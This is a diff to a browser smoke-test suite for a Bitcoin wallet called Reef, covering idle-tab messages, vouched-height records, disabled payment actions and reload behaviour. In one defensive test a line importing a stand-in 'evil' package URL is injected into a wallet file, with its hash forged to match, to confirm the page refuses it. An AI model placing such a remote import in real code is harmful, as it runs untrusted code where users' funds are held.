@@ -43,8 +43,21 @@ const FAKE_SHA = createHash('sha256')
 const FAKE_RELAY_SHA = createHash('sha256')
   .update(readFileSync(`${ROOT}test/fake/relay.mjs`))
   .digest('hex');
-const forSmoke = (src) => {
+// outsideImport: one file of the wallet's code served with an import of a full URL added, and its pinned hash made to match,
+// so only the page's own import check stands between it and running (it must refuse the file: only relative imports are
+// rewritten to checked code)
+const LIB_PIN = readFileSync(`${ROOT}reef.js`, 'utf8').match(/sidestr\/spec@([0-9a-f]{40})/)[1];
+const OUTSIDE = 'siding/lib/address.mjs';
+const outsideBody = () =>
+  String(execSync(`git -C ${SPEC} show ${LIB_PIN}:${OUTSIDE}`, { stdio: ['ignore', 'pipe', 'ignore'] })) +
+  "\nimport 'https://cdn.jsdelivr.net/npm/evil@1.0.0/x.js';\n";
+const forSmoke = (src, { outsideImport = false } = {}) => {
   const real = src.match(/'siding\/lib\/relay\.mjs': '([0-9a-f]{64})'/)[1];
+  if (outsideImport)
+    src = src.replace(
+      /'siding\/lib\/address\.mjs': '[0-9a-f]{64}'/,
+      `'siding/lib/address.mjs': '${createHash('sha256').update(outsideBody()).digest('hex')}'`,
+    );
   return src
     .replace(/const TABNODE_SHA256 = '[0-9a-f]{64}'/, `const TABNODE_SHA256 = '${FAKE_SHA}'`)
     .replace(
@@ -58,8 +71,17 @@ const browser = await chromium.launch(process.env.CHROME ? { executablePath: pro
 
 // one browser profile: seed its storage, then open Reef in one or more pages
 // tamper: the loader served with a byte changed (its hash no longer matches); oldV: index.html asks for another reef.js
-// version (a cached page of an older release); noSession: sessionStorage throws, as when site data is blocked
-async function profile({ libDelay = 0, startMs = 50, seed = {}, tamper = false, oldV = null, noSession = false } = {}) {
+// version (a cached page of an older release); noSession: sessionStorage throws, as when site data is blocked; outsideImport:
+// a wallet file that imports a full URL (see forSmoke)
+async function profile({
+  libDelay = 0,
+  startMs = 50,
+  seed = {},
+  tamper = false,
+  oldV = null,
+  noSession = false,
+  outsideImport = false,
+} = {}) {
   const ctx = await browser.newContext();
   await ctx.route('**/*', async (route) => {
     const u = route.request().url();
@@ -79,7 +101,8 @@ async function profile({ libDelay = 0, startMs = 50, seed = {}, tamper = false, 
       if (body == null) return route.fulfill({ status: 404, body: '' });
       // the page checks its node loader by sha256: the fake loader's hash stands in for the pinned one (the real pin is
       // checked against the commit by the release test)
-      if (typeof p === 'string' && p.endsWith('/reef.js')) body = forSmoke(String(body));
+      if (typeof p === 'string' && p.endsWith('/reef.js')) body = forSmoke(String(body), { outsideImport });
+      if (outsideImport && typeof p === 'object' && p.sha === LIB_PIN && p.path === OUTSIDE) body = outsideBody();
       if (tamper && typeof p === 'string' && p.endsWith('/fake/tabnode.js')) body = String(body) + '\n// changed\n';
       if (oldV && typeof p === 'string' && p.endsWith('/index.html'))
         body = String(body).replace(/reef\.js\?v=[^"]+"/, `reef.js?v=${oldV}"`);
@@ -91,6 +114,21 @@ async function profile({ libDelay = 0, startMs = 50, seed = {}, tamper = false, 
     return route.fulfill({ status: 404, body: '' }); // the mirror over http: nothing leaves the test (relays are faked above)
   });
   await ctx.addInitScript((ms) => (window.__START_MS = ms), startMs);
+  // every text the status line shows, from the first paint (an idle tab must never say it is starting)
+  await ctx.addInitScript(() => {
+    window.__syncTexts = [];
+    const watch = () => {
+      const el = document.getElementById('syncmsg');
+      if (!el) return requestAnimationFrame(watch);
+      window.__syncTexts.push(el.textContent);
+      new MutationObserver(() => window.__syncTexts.push(el.textContent)).observe(el, {
+        childList: true,
+        characterData: true,
+        subtree: true,
+      });
+    };
+    watch();
+  });
   if (noSession)
     await ctx.addInitScript(() =>
       Object.defineProperty(window, 'sessionStorage', {
@@ -242,9 +280,15 @@ for (const [name, opts] of [
   t('the running tab is not marked idle', !(await a.evaluate(() => document.body.classList.contains('idle'))));
   const twotabs = (pg) => pg.evaluate(() => document.querySelector('#banners [data-b=twotabs] .bt')?.textContent ?? '');
   t(
-    'the idle tab names what holds the node: Reef, in another tab',
-    /^Reef is already open in another tab/.test(await twotabs(b)),
+    'the idle tab names what holds the node: Reef and its version, in another tab',
+    /^Reef \d{4}-\d{2}-\d{2}\.\d+ already runs the node in another tab/.test(await twotabs(b)),
     await twotabs(b),
+  );
+  t(
+    'the idle tab never said "Starting…" (it said what it was checking, then that it is idle)',
+    !(await b.evaluate(() => (window.__syncTexts ?? []).some((x) => /Starting/i.test(x)))) &&
+      (await b.evaluate(() => (window.__syncTexts ?? []).some((x) => /checking whether another tab/.test(x)))),
+    await b.evaluate(() => (window.__syncTexts ?? []).join(' | ')),
   );
   // an older Reef holding the node: named with its version, and told (through storage) to look for its update now
   await a.waitForTimeout(Math.max(0, 6500 - (Date.now() - aOpened))); // its own first check (5 s after loading) is past
@@ -262,6 +306,16 @@ for (const [name, opts] of [
     `${await twotabs(c)} | version.json asked ${asked}x`,
   );
   await c.close();
+  // a newer Reef holding the node: this tab is the old one, and says so
+  await a.evaluate(() => localStorage.setItem('reef:running', JSON.stringify({ app: 'Reef', version: '2099-01-01.1', at: Date.now() })));
+  const d = await p.open();
+  await d.waitForFunction(() => document.body.classList.contains('idle'), null, { timeout: 10000 });
+  t(
+    'an idle tab older than the Reef holding the node says it is the one to reload',
+    /A newer Reef \(2099-01-01\.1\).*reload it/.test(await twotabs(d)),
+    await twotabs(d),
+  );
+  await d.close();
   const shown = await a.evaluate(() =>
     [...document.querySelectorAll('[hidden]')].filter((e) => getComputedStyle(e).display !== 'none').map((e) => e.id || e.className),
   );
@@ -795,6 +849,162 @@ for (const noSession of [false, true]) {
       : 'a mixed release: one reload that keeps the #hash, then the page runs',
     loads === want && (await page.evaluate(() => !!window.__fake)) && (noSession || (/[?&]r=\d/.test(url) && url.endsWith('#t'))),
     `${loads} loads, ${url}`,
+  );
+  await p.ctx.close();
+}
+// 13: the page's record of the vouched height: an old bare number is not trusted; the record follows the node up, down and away
+{
+  const p = await profile({ seed: { 'reef:started': '1', 'reef:key': KEY, 'reef:vouched': '152100' } });
+  const a = await p.open();
+  await a.waitForFunction(() => /^tb1p/.test(document.getElementById('rcvaddr').value), null, { timeout: 30000 });
+  await a.evaluate(
+    ({ script }) => {
+      window.__fake.emit('message', { type: 'synced', height: 152100, applied: true });
+      window.__fake.emit('message', {
+        type: 'coins',
+        script,
+        height: 152100,
+        coins: [
+          { key: 'cd'.repeat(32) + ':0', value: 20000, height: 152000 },
+          { key: 'ef'.repeat(32) + ':1', value: 30000, height: 152080 },
+        ],
+      });
+    },
+    { script: SCRIPT },
+  );
+  await a.waitForTimeout(1200);
+  t(
+    'an old bare-number record of the vouched height is ignored: with no tip, money above the snapshot base waits',
+    /^0\.00000000/.test(await a.textContent('#avail')),
+    await a.textContent('#avail'),
+  );
+  const say = (vouchedTo) =>
+    a.evaluate((vouchedTo) => {
+      window.__fake.emit('message', {
+        type: 'nostr',
+        height: 152100,
+        hash: 'ab'.repeat(32),
+        agree: 3,
+        diverged: false,
+        live: true,
+        created_at: Math.floor(Date.now() / 1000),
+        vouchedTo,
+      });
+    }, vouchedTo);
+  const stored = async () => JSON.parse((await ls(a, 'reef:vouched')) ?? 'null')?.height ?? null;
+  await say(152100);
+  await a.waitForFunction(() => /^0\.00050000/.test(document.getElementById('avail').textContent), null, { timeout: 5000 }).catch(() => {});
+  const up = { rec: await stored(), avail: await a.textContent('#avail') };
+  await say(152050);
+  await a.waitForFunction(() => /^0\.00020000/.test(document.getElementById('avail').textContent), null, { timeout: 5000 }).catch(() => {});
+  const down = { rec: await stored(), avail: await a.textContent('#avail') };
+  await say(null);
+  await a.waitForTimeout(500);
+  const gone = { raw: await ls(a, 'reef:vouched') };
+  t(
+    "the record follows the node's vouched height: raised with it, lowered by a newer lower one (money above waits again), removed when the node has none",
+    up.rec === 152100 &&
+      up.avail.startsWith('0.00050000') &&
+      down.rec === 152050 &&
+      down.avail.startsWith('0.00020000') &&
+      gone.raw === null,
+    JSON.stringify({ up, down, gone }),
+  );
+  t('no page errors while the vouched height moves', !p.errors.length, p.errors.join(' | '));
+  await p.ctx.close();
+}
+// 14: a node that stops after a payment was made: raise, cancel, publish again and forget each say why, and nothing goes out
+{
+  const p = await profile({ seed: { 'reef:started': '1', 'reef:key': KEY, 'reef:vouched': VOUCHED } });
+  const a = await p.open();
+  await a.waitForFunction(() => /^tb1p/.test(document.getElementById('rcvaddr').value), null, { timeout: 30000 });
+  await a.evaluate(
+    ({ script }) => {
+      window.__fake.emit('message', { type: 'synced', height: 152100, applied: true });
+      window.__fake.emit('message', {
+        type: 'coins',
+        script,
+        height: 152100,
+        coins: [{ key: 'cd'.repeat(32) + ':0', value: 50000, height: 152000 }],
+      });
+    },
+    { script: SCRIPT },
+  );
+  await a.waitForFunction(() => /0\.00050000/.test(document.getElementById('avail').textContent), null, { timeout: 5000 });
+  await a.evaluate(() => document.querySelector('[data-p=send]').click());
+  await a.fill('#sendto', 'tb1qw508d6qejxtdg4y5r3zarvary0c5xw7kxpjzsx');
+  await a.fill('#sendamt', '0.0001');
+  await a.click('#sendgo');
+  await a.waitForSelector('#ask[open]', { timeout: 5000 });
+  await a.click('#ask-ok');
+  await a.waitForFunction(() => (window.__relay ?? []).length === 1, null, { timeout: 15000 });
+  // the actions offered while the node runs; their buttons are kept (as a click that was already on its way would be)
+  await a.evaluate(() => document.querySelector('[data-p=tx]').click());
+  await a.waitForFunction(() => document.querySelectorAll('#txrows button[data-act]').length > 0, null, { timeout: 5000 }).catch(() => {});
+  const before = await a.evaluate(() => {
+    window.__kept = [...document.querySelectorAll('#txrows button[data-act]')];
+    return window.__kept.map((b) => b.dataset.act);
+  });
+  await a.evaluate(() => {
+    window.__fake.node.phase = 'error';
+    window.__fake.emit('message', { type: 'error', text: 'the node did not wipe in time and is stopped', fatal: true });
+  });
+  await a.waitForTimeout(300);
+  const after = await a.evaluate(() => [...document.querySelectorAll('#txrows button[data-act]')].map((b) => b.dataset.act));
+  const tried = [];
+  for (const act of ['bump', 'cancel', 'again', 'forget']) {
+    if (!before.includes(act)) continue;
+    await a.evaluate((act) => window.__kept.find((b) => b.dataset.act === act).click(), act);
+    await a.waitForTimeout(300);
+    tried.push({ act, dialog: !!(await a.$('#ask[open]')) });
+    if (await a.$('#ask[open]')) await a.click('#ask-cancel');
+  }
+  const toasts = await a.evaluate(() => document.getElementById('toastwrap')?.textContent ?? '');
+  t(
+    'a stopped node: the payment actions are no longer offered, a click already on its way says why and opens nothing, and nothing is published',
+    before.includes('bump') &&
+      before.includes('cancel') &&
+      !after.some((x) => x !== 'hide') &&
+      tried.length >= 2 &&
+      tried.every((x) => !x.dialog) &&
+      /node is stopped/.test(toasts) &&
+      (await a.evaluate(() => window.__relay.length)) === 1,
+    JSON.stringify({ before, after, tried, toasts: toasts.slice(0, 160) }),
+  );
+  await p.ctx.close();
+}
+// 15: a file of the wallet's code that imports a full URL (its hash made to match) is still refused: nothing of it runs
+{
+  const p = await profile({ seed: { 'reef:started': '1', 'reef:key': KEY }, outsideImport: true });
+  const page = await p.ctx.newPage();
+  const fetched = [];
+  page.on('request', (r) => /evil@/.test(r.url()) && fetched.push(r.url()));
+  await page.goto('http://localhost:8799/index.html');
+  await page.waitForSelector('#banners [data-b=walleterr]', { timeout: 30000 }).catch(() => {});
+  const text = await page.evaluate(() => document.querySelector('#banners [data-b=walleterr]')?.textContent ?? '');
+  t(
+    "a wallet file importing a full URL is refused by the page's own check (the wallet does not start), and the URL is never fetched",
+    /address\.mjs imports https:\/\/cdn\.jsdelivr\.net\/npm\/evil@1\.0\.0\/x\.js/.test(text) && !fetched.length,
+    `${text.slice(0, 200)} | fetched ${fetched.join(', ')}`,
+  );
+  await p.ctx.close();
+}
+// 16: the newer-schema notice's Reload keeps the address (its query and #hash) and only sets a fresh v=
+{
+  const p = await profile({ seed: returning({ 'reef:schema': '99' }) });
+  const page = await p.ctx.newPage();
+  await page.goto('http://localhost:8799/index.html?keep=1#h');
+  await page.waitForSelector('#banners [data-b=schema]', { timeout: 30000 });
+  const nav = page.waitForNavigation({ timeout: 10000 }).catch(() => null);
+  await page.evaluate(() =>
+    [...document.querySelectorAll('#banners [data-b=schema] button')].find((b) => /Reload/.test(b.textContent)).click(),
+  );
+  await nav;
+  const url = page.url();
+  t(
+    'a newer schema: Reload keeps the query and the #hash, and sets a fresh v=',
+    /[?&]keep=1/.test(url) && /[?&]v=\d+/.test(url) && url.endsWith('#h'),
+    url,
   );
   await p.ctx.close();
 }
